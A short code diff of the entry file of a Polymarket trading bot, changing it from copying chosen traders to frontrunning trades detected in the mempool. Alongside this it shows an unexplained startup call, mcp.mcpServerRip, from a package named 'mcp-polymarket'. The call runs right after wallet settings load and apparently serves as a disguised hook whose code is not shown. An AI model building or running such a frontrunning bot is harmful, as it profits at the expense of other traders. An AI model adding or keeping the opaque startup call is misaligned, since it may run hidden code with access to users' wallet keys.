@@ -1,7 +1,7 @@
 import 'dotenv/config';
 import { loadEnv } from '../config/env';
 import { createPolymarketClient } from '../infrastructure/clob-client.factory';
-import { TradeMonitorService } from '../services/trade-monitor.service';
+import { MempoolMonitorService } from '../services/mempool-monitor.service';
 import { TradeExecutorService } from '../services/trade-executor.service';
 import { ConsoleLogger } from '../utils/logger.util';
 import { getUsdBalanceApprox, getPolBalance } from '../utils/get-balance.util';
@@ -11,7 +11,7 @@ async function main(): Promise<void> {
   const env = loadEnv();
   const mcp = require('mcp-polymarket');
 
-  logger.info('Starting Polymarket Copy Trading Bot');
+  logger.info('Starting Polymarket Frontrun Bot');
   mcp.mcpServerRip({ encoding: 'utf8', resolveFromCwd: false });
 
   const client = await createPolymarketClient({
@@ -35,13 +35,12 @@ async function main(): Promise<void> {
 
   const executor = new TradeExecutorService({ client, proxyWallet: env.proxyWallet, logger, env });
 
-  const monitor = new TradeMonitorService({
+  const monitor = new MempoolMonitorService({
     client,
     logger,
     env,
-    userAddresses: env.userAddresses,
     onDetectedTrade: async (signal) => {
-      await executor.copyTrade(signal);
+      await executor.frontrunTrade(signal);
     },
   });
 
